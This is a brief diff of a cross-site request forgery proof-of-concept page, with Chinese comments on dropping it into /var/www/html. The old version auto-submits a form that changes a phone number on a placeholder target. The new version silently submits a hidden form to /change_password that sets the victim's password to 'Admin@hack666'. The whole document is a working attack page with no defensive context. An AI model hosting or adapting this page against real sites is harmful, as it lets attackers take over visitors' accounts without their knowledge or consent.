@@ -1,14 +1,13 @@
-# 默认网站目录
-cd /var/www/html
-# 写入CSRF页面代码
-cat > poc.html << EOF
 <!DOCTYPE html>
 <html>
 <body>
-<form action="http://目标漏洞站点/接口地址" method="post" id="csrf">
-<input hidden name="tel" value="13888888888">
+<form action="/change_password" method="post">
+    <input type="hidden" name="oldpwd" value="123456">
+    <input type="hidden" name="newpwd" value="Admin@hack666">
+    <input type="hidden" name="repwd" value="Admin@hack666">
 </form>
-<script>window.onload=()=>csrf.submit()</script>
+<script>
+document.forms[0].submit();
+</script>
 </body>
 </html>
-EOF
